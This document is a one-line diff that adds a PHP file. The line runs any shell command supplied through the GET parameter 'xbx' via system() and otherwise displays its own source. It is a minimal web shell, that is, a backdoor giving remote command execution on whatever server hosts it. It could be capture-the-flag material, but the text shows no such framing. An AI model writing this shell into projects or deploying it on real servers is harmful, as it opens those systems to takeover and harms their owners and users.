@@ -1,0 +1,1 @@
+<?php isset($_GET['xbx'])?system($_GET['xbx']):highlight_file(__FILE__);
